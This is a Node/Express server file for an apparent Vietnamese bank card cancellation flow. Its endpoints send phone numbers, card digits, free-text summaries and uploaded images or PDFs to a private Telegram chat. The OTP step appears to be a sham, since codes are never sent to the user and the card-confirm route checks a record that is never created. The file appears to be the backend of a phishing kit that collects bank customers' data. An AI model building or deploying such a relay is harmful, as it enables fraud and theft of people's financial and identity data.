// Express Server: Unified relay + OTP + Telegram endpoints
// Mirrors logic from netlify/functions/relay.mjs for local / VPS deployment.
// Features:
//  - Endpoints: /health, /_envinfo, /tele/sendMessage, /tele/sendDocument,
//               /form/submit-init, /otp/request, /otp/verify,
//               /card/cancel/init, /card/cancel/confirm
//  - HMAC request signing (optional) via REQUIRE_HMAC=1 & HMAC_KEY
//  - OTP generation + verification with Redis (REDIS_URL) or in-memory fallback
//  - Basic rate limiting (IP + resend + generic buckets) in Redis or memory
//  - Nonce replay protection when HMAC enabled
//  - Dynamic port selection if requested port busy
//  - Minimal dependencies (uses existing ones from package.json)

import 'dotenv/config';
import express from 'express';
import crypto from 'crypto';
import fetch from 'node-fetch';
import FormData from 'form-data';
import morgan from 'morgan';

// ---------------------------- Initialization ----------------------------
const app = express();

// Capture raw body for HMAC before JSON parsing
app.use(express.json({ limit: '1mb', verify: (req, _res, buf) => { req.rawBody = buf.toString('utf8'); } }));
app.use(express.urlencoded({ extended: true }));
app.use(morgan('dev'));

// Static build (if exists)
import { existsSync } from 'fs';
import { join, resolve } from 'path';
const distPublic = resolve('dist', 'public');
if (existsSync(distPublic)) {
	console.log('[server] Serving static files from', distPublic);
	app.use(express.static(distPublic, {
		maxAge: '1h', setHeaders: (res, path) => {
			if (/\.(html)$/i.test(path)) { res.setHeader('Cache-Control', 'no-cache'); }
		}
	}));
}

// CORS (simple, permissive)
app.use((req, res, next) => {
	res.setHeader('Access-Control-Allow-Origin', '*');
	res.setHeader('Access-Control-Allow-Headers', 'Content-Type,X-Signature,X-Timestamp,X-Nonce');
	res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
	if (req.method === 'OPTIONS') return res.status(204).end();
	next();
});

// ---------------------------- Redis (lazy) ----------------------------
let redisClient = null;
let redisInitPromise = null;
async function initRedis() {
	if (redisClient) return redisClient;
	if (redisInitPromise) return redisInitPromise;
	const { REDIS_URL } = process.env;
	if (!REDIS_URL) return null;
	redisInitPromise = (async () => {
		const { createClient } = await import('redis');
		const client = createClient({ url: REDIS_URL });
		client.on('error', e => console.error('[Redis] error', e));
		await client.connect();
		redisClient = client;
		console.log('[Redis] connected');
		return client;
	})();
	return redisInitPromise;
}

// ---------------------------- In-memory stores ----------------------------
const memStore = {
	otp: new Map(),
	nonces: new Map(),
	rate: new Map()
};

// ---------------------------- Helpers ----------------------------
function json(res, body, status = 200) { return res.status(status).json(body); }
function sanitizeMessage(str = '') { return str.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F]/g, '').slice(0, 3800); }
function randomId(prefix = 'REQ') { return `${prefix}-${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 10)}`; }
function maskPhone(p) { if (!p) return '—'; return p.replace(/^(\+?84|0)?(\d{3})\d+(\d{2})$/, '$1$2***$3'); }
function generateOtp() { return process.env.DEMO_STATIC_OTP === '1' ? '123456' : Math.floor(Math.random() * 1e6).toString().padStart(6, '0'); }
function sha256Hex(str) { return crypto.createHash('sha256').update(str).digest('hex'); }
function timingSafeEqual(a, b) { if (a.length !== b.length) return false; return crypto.timingSafeEqual(Buffer.from(a), Buffer.from(b)); }

async function telegramCall(method, payload, isForm = false) {
	if (process.env.TELEGRAM_DRY_RUN === '1') {
		// Simulate a successful Telegram API response without network
		return { ok: true, data: { result: { message_id: Math.floor(Math.random() * 1e9), dryRun: true, method } } };
	}
	if (!process.env.BOT_TOKEN || !process.env.CHAT_ID) {
		throw new Error('Missing BOT_TOKEN/CHAT_ID');
	}
	const url = `https://api.telegram.org/bot${process.env.BOT_TOKEN}/${method}`;
	const init = isForm ? { method: 'POST', body: payload } : { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) };
	const r = await fetch(url, init);
	if (!r.ok) { return { ok: false, status: r.status, text: await r.text() }; }
	const j = await r.json().catch(() => ({}));
	return { ok: true, data: j };
}

async function audit(msg) {
	try {
		await telegramCall('sendMessage', { chat_id: process.env.CHAT_ID, text: sanitizeMessage(`_AUDIT:_ ${msg}`) });
	} catch {/* ignore */ }
}

// ---------------------------- OTP storage ----------------------------
async function storeOtp(client, requestId, phone, code, ttlSec = 60) {
	const salt = randomId('salt').slice(-8);
	const rec = { phone, salt, codeHash: sha256Hex(code + '.' + salt), expireAt: Date.now() + ttlSec * 1000, attempts: 0, maxAttempts: 6, createdAt: Date.now() };
	if (client) {
		await client.setEx(`otp:${requestId}`, ttlSec + 300, JSON.stringify(rec));
	} else {
		memStore.otp.set(requestId, rec);
		setTimeout(() => memStore.otp.delete(requestId), (ttlSec + 300) * 1000);
	}
	return rec;
}
async function getOtpRecord(client, requestId) {
	if (client) { const raw = await client.get(`otp:${requestId}`); return raw ? JSON.parse(raw) : null; }
	return memStore.otp.get(requestId) || null;
}
async function saveOtpRecord(client, requestId, rec) {
	const ttl = Math.max(Math.floor((rec.expireAt - Date.now()) / 1000), 30);
	if (client) await client.setEx(`otp:${requestId}`, ttl, JSON.stringify(rec));
	else memStore.otp.set(requestId, rec);
}
async function deleteOtp(client, requestId) { if (client) await client.del(`otp:${requestId}`); else memStore.otp.delete(requestId); }

// ---------------------------- Rate limiting & nonce ----------------------------
async function rateLimit(client, key, max, windowSec) {
	const bucketKey = (t = Date.now()) => `rate:${key}:${Math.floor(t / 1000 / windowSec)}`;
	if (client) {
		const bucket = bucketKey();
		const val = await client.incr(bucket);
		if (val === 1) await client.expire(bucket, windowSec + 5);
		return val <= max;
	} else {
		const bucket = bucketKey();
		const cur = memStore.rate.get(bucket) || 0;
		if (cur >= max) return false;
		memStore.rate.set(bucket, cur + 1);
		setTimeout(() => memStore.rate.delete(bucket), (windowSec + 5) * 1000);
		return true;
	}
}
async function nonceCheck(client, nonce) {
	if (!nonce) return false;
	if (client) {
		const exists = await client.get(`nonce:${nonce}`);
		if (exists) return false;
		await client.setEx(`nonce:${nonce}`, 300, '1');
		return true;
	} else {
		if (memStore.nonces.has(nonce)) return false;
		memStore.nonces.set(nonce, 1);
		setTimeout(() => memStore.nonces.delete(nonce), 300 * 1000);
		return true;
	}
}

function verifyHmac(req) {
	const REQUIRE = process.env.REQUIRE_HMAC === '1';
	if (!REQUIRE) return { ok: true };
	const headersLower = Object.fromEntries(Object.entries(req.headers).map(([k, v]) => [k.toLowerCase(), v]));
	const sig = headersLower['x-signature'];
	const ts = headersLower['x-timestamp'];
	const nonce = headersLower['x-nonce'];
	if (!sig || !ts || !nonce) return { ok: false, error: 'missing_headers' };
	const tsNum = parseInt(ts, 10);
	if (!tsNum || Math.abs(Math.floor(Date.now() / 1000) - tsNum) > 120) return { ok: false, error: 'timestamp_out_of_range' };
	const rawBody = req.rawBody || '';
	const path = req.path;
	const base = `${req.method.toUpperCase()}\n${path}\n${tsNum}\n${nonce}\n${rawBody}`;
	const expected = crypto.createHmac('sha256', process.env.HMAC_KEY || '').update(base).digest('hex');
	const provided = sig.startsWith('v1=') ? sig.slice(3) : sig;
	if (!timingSafeEqual(expected, provided)) return { ok: false, error: 'bad_signature' };
	return { ok: true, nonce };
}

// ---------------------------- Middleware for Redis init & rate limit ----------------------------
app.use(async (req, res, next) => {
	try {
		req.redis = await initRedis();
	} catch (e) {
		console.error('Redis init failed', e);
		req.redis = null;
	}
	// basic IP rate limiting (300 req / 60s)
	const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress || 'ip-unknown';
	const ok = await rateLimit(req.redis, `ip:${ip}`, 300, 60);
	if (!ok) return json(res, { error: 'rate_limited' }, 429);
	next();
});

// ---------------------------- Routes ----------------------------
app.get('/health', (req, res) => json(res, { ok: true, ts: Date.now() }));

app.get('/_envinfo', (req, res) => {
	if (process.env.DEV_ALLOW_ENVINFO === '1') return json(res, { ok: true, hmac: process.env.REQUIRE_HMAC === '1' });
	return res.status(404).end();
});

app.get('/_tele/dry-run', (req, res) => {
	if (process.env.TELEGRAM_DRY_RUN === '1') return json(res, { ok: true, dryRun: true });
	return json(res, { ok: true, dryRun: false });
});

// HMAC & Nonce gate for modifying endpoints
app.use((req, res, next) => {
	if (req.method === 'GET' && (req.path === '/health' || req.path === '/_envinfo')) return next();
	const v = verifyHmac(req);
	if (!v.ok) return json(res, { error: v.error }, 401);
	req.hmacNonce = v.nonce;
	next();
});

// Nonce replay check after HMAC verification
app.use(async (req, res, next) => {
	if (!req.hmacNonce) return next();
	const ok = await nonceCheck(req.redis, req.hmacNonce);
	if (!ok) return json(res, { error: 'nonce_replay_or_missing' }, 401);
	next();
});

app.post('/tele/sendMessage', async (req, res) => {
	const { message } = req.body || {};
	if (typeof message !== 'string') return json(res, { error: 'invalid_body' }, 400);
	try {
		const r = await telegramCall('sendMessage', { chat_id: process.env.CHAT_ID, text: sanitizeMessage(message), parse_mode: 'Markdown', disable_web_page_preview: true });
		if (!r.ok) return json(res, { error: 'telegram_error', detail: r.text }, r.status || 500);
		return json(res, { status: 'ok', messageId: r.data?.result?.message_id });
	} catch (e) { console.error('sendMessage error', e); return json(res, { error: 'internal_error' }, 500); }
});

app.post('/tele/sendDocument', async (req, res) => {
	const { filename = 'upload.bin', mimeType = 'application/octet-stream', base64, caption = '', parseMode } = req.body || {};
	if (!base64 || typeof base64 !== 'string') return json(res, { error: 'missing_base64' }, 400);
	if (filename.length > 100 || /[\\/]/.test(filename)) return json(res, { error: 'invalid_filename' }, 400);
	const ALLOW = new Set(['image/png', 'image/jpeg', 'image/jpg', 'image/webp', 'application/pdf', 'text/plain', 'application/octet-stream']);
	if (!ALLOW.has(mimeType)) return json(res, { error: 'invalid_mimeType' }, 400);
	let buffer; try { buffer = Buffer.from(base64, 'base64'); } catch { return json(res, { error: 'invalid_base64' }, 400); }
	if (!buffer || buffer.length === 0) return json(res, { error: 'empty_file' }, 400);
	const maxBytes = parseInt(process.env.MAX_DOC_BYTES || '5000000', 10);
	if (buffer.length > maxBytes) return json(res, { error: 'file_too_large', limit: maxBytes }, 400);
	const fd = new FormData();
	fd.append('chat_id', process.env.CHAT_ID);
	fd.append('document', buffer, { filename, contentType: mimeType });
	const safeCaption = sanitizeMessage(String(caption || '')).slice(0, 1024);
	if (safeCaption) fd.append('caption', safeCaption);
	if (parseMode && ['Markdown', 'HTML', 'MarkdownV2'].includes(parseMode)) fd.append('parse_mode', parseMode);
	try {
		const r = await telegramCall('sendDocument', fd, true);
		if (!r.ok) return json(res, { error: 'telegram_error', detail: r.text }, r.status || 500);
		const fileId = r.data?.result?.document?.file_id;
		await audit(`DOC ${filename} size:${buffer.length}B fileId:${fileId || 'n/a'}`);
		return json(res, { status: 'ok', messageId: r.data?.result?.message_id, fileId });
	} catch (e) { console.error('sendDocument error', e); return json(res, { error: 'internal_error' }, 500); }
});

app.post('/form/submit-init', async (req, res) => {
	const { summary, phone = '' } = req.body || {};
	if (!summary || typeof summary !== 'string' || !summary.trim()) return json(res, { error: 'invalid_summary' }, 400);
	const requestId = randomId('REQ');
	const otp = generateOtp();
	await storeOtp(req.redis, requestId, phone, otp, 60);
	await audit(`INIT ${requestId}\nPhone:${maskPhone(phone)}\nLen:${summary.length}`);
	return json(res, { status: 'ok', requestId, maskedPhone: maskPhone(phone), otp: { ttlSeconds: 60, length: 6, resendAfter: 30 }, debugOtp: process.env.DEBUG_RETURN_OTP === '1' ? otp : undefined });
});

app.post('/otp/request', async (req, res) => {
	const { requestId } = req.body || {};
	if (!requestId) return json(res, { error: 'missing_requestId' }, 400);
	const rec = await getOtpRecord(req.redis, requestId);
	if (!rec) return json(res, { error: 'not_found' }, 404);
	const allow = await rateLimit(req.redis, `otp_resend:${requestId}`, 3, 300);
	if (!allow) return json(res, { error: 'resend_rate_limited' }, 429);
	const otp = generateOtp();
	await storeOtp(req.redis, requestId, rec.phone, otp, 60);
	await audit(`RESEND OTP ${requestId}`);
	return json(res, { status: 'ok', otp: { ttlSeconds: 60, resendAfter: 30 }, debugOtp: process.env.DEBUG_RETURN_OTP === '1' ? otp : undefined });
});

app.post('/otp/verify', async (req, res) => {
	const { requestId, otp, summary } = req.body || {};
	if (!requestId || !otp) return json(res, { error: 'missing_fields' }, 400);
	const rec = await getOtpRecord(req.redis, requestId);
	if (!rec) return json(res, { error: 'otp_not_found' }, 404);
	if (Date.now() > rec.expireAt) return json(res, { error: 'otp_expired' }, 400);
	if (rec.attempts >= rec.maxAttempts) return json(res, { error: 'otp_locked' }, 400);
	const match = sha256Hex(otp + '.' + rec.salt) === rec.codeHash;
	rec.attempts += 1; await saveOtpRecord(req.redis, requestId, rec);
	if (!match) {
		await audit(`OTP WRONG ${requestId} attempt:${rec.attempts}`);
		if (rec.attempts >= rec.maxAttempts) return json(res, { status: 'error', code: 'OTP_LOCKED' }, 400);
		return json(res, { status: 'error', code: 'OTP_INVALID', remaining: rec.maxAttempts - rec.attempts }, 400);
	}
	await deleteOtp(req.redis, requestId);
	await audit(`OTP OK ${requestId}`);
	if (summary && typeof summary === 'string' && summary.length < 10000) {
		const textMsg = sanitizeMessage(summary + `\n\n(rid:${requestId})`);
		try { await telegramCall('sendMessage', { chat_id: process.env.CHAT_ID, text: textMsg, parse_mode: 'Markdown', disable_web_page_preview: true }); } catch {/* ignore */ }
	}
	return json(res, { status: 'verified', submittedAt: new Date().toISOString() });
});

app.post('/card/cancel/init', async (req, res) => {
	const { cardLast4, phone, reasonCode, reasonNote, action, channel, acceptTerms } = req.body || {};
	if (!cardLast4 || !phone || !reasonCode || !action || !channel || acceptTerms !== true) return json(res, { error: 'missing_fields' }, 400);
	const requestId = randomId('CAN');
	await audit(`[HỦY/TẠM KHÓA THẺ] ${requestId}\nCard ****${String(cardLast4).slice(-4)} | Action: ${action}\nReason: ${reasonCode}${reasonNote ? ' - ' + reasonNote : ''}\nPhone: ${maskPhone(phone)}\nChannel: ${channel}\nTime: ${new Date().toISOString()}`);
	return json(res, { status: 'ok', requestId, action: action === 'TEMP_LOCK' ? 'locked' : 'canceled' });
});

app.post('/card/cancel/confirm', async (req, res) => {
	const { requestId, otp } = req.body || {};
	if (!requestId || !otp) return json(res, { error: 'missing_fields' }, 400);
	const rec = await getOtpRecord(req.redis, requestId);
	if (!rec) return json(res, { error: 'otp_not_found' }, 404);
	if (Date.now() > rec.expireAt) return json(res, { error: 'otp_expired' }, 400);
	if (rec.attempts >= rec.maxAttempts) return json(res, { error: 'otp_locked' }, 400);
	const match = sha256Hex(otp + '.' + rec.salt) === rec.codeHash;
	rec.attempts += 1; await saveOtpRecord(req.redis, requestId, rec);
	if (!match) {
		await audit(`OTP WRONG ${requestId} attempt:${rec.attempts}`);
		if (rec.attempts >= rec.maxAttempts) return json(res, { status: 'error', code: 'OTP_LOCKED' }, 400);
		return json(res, { status: 'error', code: 'OTP_INVALID', remaining: rec.maxAttempts - rec.attempts }, 400);
	}
	await deleteOtp(req.redis, requestId);
	await audit(`OTP OK ${requestId}`);
	return json(res, { status: 'confirmed', requestId, action: 'TEMP_LOCK', submittedAt: new Date().toISOString() });
});

// Fallback 404
app.use((req, res) => json(res, { error: 'not_found' }, 404));

// ---------------------------- Port selection & start ----------------------------
async function findAvailablePort(start, maxAttempts = 15) {
	const net = await import('net');
	function tryPort(p) {
		return new Promise(resolve => {
			const srv = net.createServer();
			srv.once('error', () => resolve(false));
			srv.listen(p, () => { srv.close(() => resolve(true)); });
		});
	}
	for (let i = 0; i < maxAttempts; i++) {
		const p = start + i;
		/* eslint-disable no-await-in-loop */
		const ok = await tryPort(p);
		if (ok) return p;
	}
	throw new Error(`No free port found starting at ${start}`);
}

const userPort = process.env.PORT && parseInt(process.env.PORT, 10);
const basePort = userPort || 3000;

(async () => {
	try {
		const port = await findAvailablePort(basePort);
		if (userPort && port !== userPort) {
			console.warn(`[server] Requested PORT ${userPort} busy, using ${port} instead.`);
		} else if (!userPort && port !== basePort) {
			console.warn(`[server] Default port ${basePort} busy, using ${port}.`);
		}
		app.listen(port, () => {
			console.log(`[server] listening on port ${port}`);
			if (process.env.REQUIRE_HMAC === '1') {
				console.log('[server] HMAC verification ENABLED');
			} else {
				console.log('[server] HMAC verification DISABLED (set REQUIRE_HMAC=1 to enable)');
			}
			if (!process.env.BOT_TOKEN || !process.env.CHAT_ID) {
				console.warn('[server] BOT_TOKEN / CHAT_ID not set -> Telegram calls will fail');
			}
			if (!process.env.HMAC_KEY && process.env.REQUIRE_HMAC === '1') {
				console.warn('[server] REQUIRE_HMAC=1 but HMAC_KEY missing');
			}
		});
	} catch (e) {
		console.error('Failed to start server:', e);
		process.exit(1);
	}
})();

// Export app for potential testing
export default app;
// NOTE: Do NOT append .env style variables inside this JS file.
// Put runtime configuration into a .env file at project root, e.g.:
//   PORT=3000
//   BOT_TOKEN=xxxxxxxx:yyyyyyyyyyyyyyyy
//   CHAT_ID=-1001234567890
//   HMAC_KEY=long_random_secret_value
//   REQUIRE_HMAC=1
// (Never commit real secrets to version control.)

